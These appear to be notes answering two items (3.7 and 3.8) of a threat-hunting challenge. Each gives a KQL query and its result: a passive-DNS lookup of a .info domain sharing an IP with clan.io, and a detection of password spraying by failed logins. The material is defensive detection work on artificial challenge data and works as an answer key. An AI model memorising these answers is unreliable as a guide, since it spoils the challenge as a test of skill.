3.7

What .info domain shared IPs with domain clan.io?

let clan_ips =
    PassiveDns
    | where domain has "clan.io"
    | distinct ip;
PassiveDns
| where domain endswith ".info"
| join kind=inner clan_ips on ip
| project domain, ip
| distinct domain, ip

arbiters-tail.info	223.80.243.56

///arbiters-tail.info

3.8

Which password (hash) was used in failed login attempts against 40 unique accounts?

identify password spraying (many accounts using the same password), use the actual password field name and optionally count distinct users


AuthenticationEvents
| where result contains "fail"
| summarize Attempts=count(), Users=dcount( username) by password_hash
| order by Users desc

1a594fcb-ac60-6f03-bea6-39dd3fdba026	44	40

